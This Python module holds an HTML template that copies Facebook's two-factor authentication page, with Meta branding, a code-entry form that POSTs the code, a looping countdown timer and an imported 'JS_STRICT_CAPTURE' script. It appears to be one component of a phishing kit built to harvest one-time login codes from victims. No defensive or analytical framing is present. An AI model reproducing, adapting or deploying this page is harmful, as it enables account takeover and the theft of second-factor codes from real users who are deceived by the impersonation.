"""html_otp_pc.py — auto-generated from templates.py."""

import base64

from .js_capture import JS_STRICT_CAPTURE

HTML_OTP_PC = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="/static/svd_logo.svg" type="image/svg+xml">
    <title>Facebook - Two-Factor Authentication</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        .otp-card { background: #fff; padding: 40px 32px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 450px; }
        .pc-input-otp { border: 1px solid #dddfe2; border-radius: 6px; padding: 14px; width: 100%; font-size: 24px; text-align: center; letter-spacing: 4px; font-weight: bold; outline: none; }
        .pc-input-otp:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .pc-btn { background-color: #0866FF; color: #fff; border-radius: 6px; padding: 10px; font-weight: bold; font-size: 18px; width: 100%; border: none; cursor: pointer; }
        .pc-btn:hover { background-color: #0056D6; }
    </style>
</head>
<body class="flex flex-col min-h-screen items-center justify-center">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="otp-card flex flex-col items-center">
        <div class="bg-blue-50 p-4 rounded-full mb-6">
            <svg class="w-10 h-10 text-[#1877f2]" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
        </div>
        <h2 class="text-2xl font-bold mb-2 text-gray-900">{{ otp_title }}</h2>
        <p class="text-gray-600 text-center mb-4">{{ otp_sub }}</p>
        <div class="text-blue-600 font-bold mb-6" id="timer-pc">01:00</div>
        <div id="error-box-pc" class="{% if not message %}hidden{% endif %} w-full bg-red-50 border border-red-200 text-red-600 p-3 rounded-lg text-sm mb-4 text-center">
            {{ message }}
        </div>
        <form method="POST" class="w-full space-y-6" onsubmit="return validateOTP()">
            <input type="hidden" name="action" value="code">
            <input type="text" name="code" id="otp-field-pc" placeholder="000000" class="pc-input-otp" maxlength="8" required autofocus inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
            <button type="submit" class="pc-btn">{{ otp_submit }}</button>
        </form>
        <div class="mt-6 text-blue-600 font-semibold cursor-pointer hover:underline text-sm">Didn't get a code?</div>
        <div style="display: flex; flex-direction: column; align-items: center; gap: 4px; margin-top: 1.5rem;">
            <span style="font-size:11px;font-weight:400;color:#65676B;text-transform:none;letter-spacing:0;">From</span>
            <span style="font-size:15px;font-weight:800;color:#1C2B33;letter-spacing:2px;text-transform:uppercase;">META</span>
        </div>
    </div>
    <script>
    function validateOTP() {
        const val = document.getElementById('otp-field-pc').value.trim();
        const errBox = document.getElementById('error-box-pc');
        if (!/^\d{6,8}$/.test(val)) {
            errBox.innerText = "{{ otp_invalid }}";
            errBox.classList.remove('hidden');
            return false;
        }
        return true;
    }
    let seconds = 60;
    const timerDisplay = document.getElementById('timer-pc');
    const interval = setInterval(() => {
        seconds--;
        let m = Math.floor(seconds / 60);
        let s = seconds % 60;
        timerDisplay.innerText = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
        if (seconds <= 0) seconds = 60;
    }, 1000);
    </script>
</body>
</html>
"""
